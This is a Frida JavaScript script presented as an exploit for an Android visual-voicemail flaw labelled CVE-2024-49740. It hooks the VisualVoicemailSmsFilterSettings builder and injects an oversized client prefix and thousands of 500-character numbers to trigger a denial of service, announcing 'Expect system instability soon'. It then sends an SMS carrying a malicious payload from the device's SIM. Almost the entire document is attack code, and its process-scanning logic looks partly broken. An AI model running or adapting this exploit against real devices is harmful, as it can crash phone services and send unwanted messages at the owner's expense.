Java.perform(function () {
    console.log("[+] CVE-2024-49740 - Dynamic Process Detection Loaded!");

    // Function to check if the class is loaded
    function isClassLoaded(className) {
        var classes = Java.enumerateLoadedClassesSync();
        return classes.includes(className);
    }

    // Step 1: Scan ALL running processes to find the target class
    var voicemailClass = "android.telephony.VisualVoicemailSmsFilterSettings$Builder";
    var foundProcess = null;
    var processes = [];

    try {
        var Process = Java.use("android.os.Process");
        var ActivityThread = Java.use("android.app.ActivityThread");
        var apps = ActivityThread.currentApplication().getPackageManager().getInstalledApplications(0);

        apps.forEach(function (app) {
            var packageName = app.packageName.value;
            processes.push(packageName);
        });
    } catch (err) {
        console.log("[X] Error retrieving process list:", err);
    }

    console.log("[?] Scanning " + processes.length + " processes for " + voicemailClass);

    for (var i = 0; i < processes.length; i++) {
        try {
            Java.performNow(function () {
                if (isClassLoaded(voicemailClass)) {
                    console.log("[✔] Found class in process: " + processes[i]);
                    foundProcess = processes[i];
                }
            });
            if (foundProcess) break;
        } catch (err) {
            console.log("[X] Error checking " + processes[i] + ": " + err);
        }
    }

    if (!foundProcess) {
        console.log("[X] No process found using " + voicemailClass + ". Exiting...");
        return;
    }

    console.log("[✔] Attaching to process: " + foundProcess);

    // Step 2: Hook VisualVoicemailSmsFilterSettings$Builder if found
    var VisualVoicemailSmsFilterSettings_Builder = Java.use(voicemailClass);

    VisualVoicemailSmsFilterSettings_Builder.setClientPrefix.implementation = function (clientPrefix) {
        console.log("[+] Hooked setClientPrefix() - Bypassing validation");

        var maliciousPrefix = "A".repeat(500);  // Oversized client prefix
        console.log("[!] Overriding clientPrefix with length:", maliciousPrefix.length);

        return this.setClientPrefix.call(this, maliciousPrefix);
    };

    VisualVoicemailSmsFilterSettings_Builder.setOriginatingNumbers.implementation = function (originatingNumbers) {
        console.log("[+] Hooked setOriginatingNumbers() - Preparing DoS attack");

        var massiveNumbers = [];
        for (var i = 0; i < 5000; i++) {  // Overload memory with 5000+ entries
            massiveNumbers.push("9".repeat(500));  // Each number is 500 characters long
        }

        console.log("[!] Overriding originatingNumbers with", massiveNumbers.length, "entries");
        return this.setOriginatingNumbers.call(this, massiveNumbers);
    };

    console.log("[!] DoS attack initialized. Expect system instability soon...");

    // Step 3: Hook TelephonyManager.setVisualVoicemailSmsFilterSettings() as a fallback
    try {
        var TelephonyManager = Java.use("android.telephony.TelephonyManager");

        TelephonyManager.setVisualVoicemailSmsFilterSettings.implementation = function (settings) {
            console.log("[+] Hooked setVisualVoicemailSmsFilterSettings!");
            console.log("Settings: " + settings.toString());

            return this.setVisualVoicemailSmsFilterSettings(settings);
        };
    } catch (err) {
        console.log("[X] Could not hook TelephonyManager: " + err);
    }

    // Step 4: Send a malicious voicemail-related SMS
    function sendVoicemailSMS() {
        console.log("[+] Attempting to send a malicious voicemail-related SMS...");

        try {
            var context = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
            var SubscriptionManager = Java.use("android.telephony.SubscriptionManager");
            var SmsManager = Java.use("android.telephony.SmsManager");
            var Context = Java.use("android.content.Context");

            var subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
            var activeSubId = subscriptionManager.getActiveSubscriptionIdList()[0];  // Get first active SIM ID

            if (activeSubId === null) {
                console.log("[X] No active SIM found! SMS sending aborted.");
                return;
            }

            var smsManager = SmsManager.getSmsManagerForSubscriptionId(activeSubId);
            var maliciousPrefix = "A".repeat(500);
            var spoofedNumber = "+1234567890";  // Fake number
            var voicemailMessage = maliciousPrefix + ": Exploit test message";

            console.log("[!] Sending SMS with malicious payload...");
            smsManager.sendTextMessage(spoofedNumber, null, voicemailMessage, null, null);

            console.log("[+] Malicious voicemail SMS sent!");
        } catch (e) {
            console.log("[X] Error sending SMS:", e);
        }
    }

    // Trigger the exploit 5 seconds after Frida injection
    setTimeout(sendVoicemailSMS, 5000);
});
